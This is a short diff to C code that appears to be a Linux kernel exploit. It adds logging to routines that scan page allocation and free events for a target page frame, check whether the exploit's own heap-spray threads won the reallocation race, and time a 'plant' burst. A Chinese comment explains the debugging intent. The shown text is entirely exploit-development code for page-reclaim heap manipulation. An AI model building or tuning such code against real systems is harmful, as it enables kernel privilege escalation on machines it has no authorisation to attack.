@@ -2260,7 +2260,7 @@ static int scan_page_alloc_ours(const unsigned char *b, size_t n,
 {
     for (size_t i = 16; i + 12 <= n; i += 4)
     {
-        int pid;
+        int pid, ours = 0;
 
         if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
             continue;
@@ -2269,7 +2269,16 @@ static int scan_page_alloc_ours(const unsigned char *b, size_t n,
         pid = (int)u32(b, i - 4);
         for (int j = 0; j < SPRAY_THREADS; j++)
             if (pid == atomic_load(&g_spray_tids[j]))
-                return 1;
+            {
+                ours = 1;
+                break;
+            }
+        /* [alloc] 打点：每条 pfn 匹配的 alloc 都打，先不判归属；
+         * 判 ours 用 pid（内核 comm 会截断），系统抢跑时 ours=0 直接可见。 */
+        logf("[alloc] pfn=%#llx pid=%d ours=%d up=%ldms\n",
+             pfn, pid, ours, now_ms());
+        if (ours)
+            return 1;
     }
     return 0;
 }
@@ -2623,6 +2632,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
      * otherwise leave the page to the next caller.
      */
     long t1 = now_ms();
+    logf("[burst] pfn=%#llx start_up=%ldms\n", slab_pfn, t1);
     int hit = 0;
 
     while (!hit && now_ms() - t1 < 15000)
@@ -2641,6 +2651,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
                      scan_page_free(raw, (size_t)m, slab_pfn))
             {
                 free_seen = 1;
+                logf("[free] pfn=%#llx up=%ldms\n", slab_pfn, now_ms());
                 atomic_store(&g_burst2, 1);
             }
         }
